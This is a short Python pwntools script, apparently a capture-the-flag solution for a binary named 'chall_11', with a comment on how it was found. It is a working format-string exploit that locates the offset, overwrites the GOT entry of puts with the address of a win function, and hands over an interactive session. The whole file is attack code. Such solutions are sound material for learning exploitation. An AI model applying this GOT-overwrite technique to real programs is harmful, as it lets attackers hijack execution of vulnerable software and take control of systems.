from pwn import *
binary = context.binary = ELF('./chall_11')

p = process('./chall_11')
p.recv()

offset = 11
payload = fmtstr_payload(offset,{binary.sym.puts:binary.sym.win})
p.sendline(payload)

null = payload.find(b'\x00')
p.recvuntil(payload[null-3:null])

p.interactive()


#Sending $p until you get the the same value as the input. This will give you the offset. After the offset you need to swape puts with win. 
